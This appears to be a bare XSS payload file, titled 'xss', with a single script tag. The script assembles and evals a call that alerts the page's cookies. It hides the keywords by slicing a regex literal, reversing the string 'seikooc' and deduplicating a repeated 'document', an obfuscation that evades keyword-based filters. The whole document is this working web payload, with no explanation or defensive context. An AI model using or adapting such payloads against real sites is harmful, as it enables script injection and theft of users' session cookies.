# xss

<script>x=([]+/alert/g).substr(1,5);w='seikooc'.split("").reduce((acc, char) => char + acc, "");bom='document,document,document';hack=[...new Set(bom.split(","))].join(",");z=x+"("+hack+'.'+w+")";z;eval(z);</script>
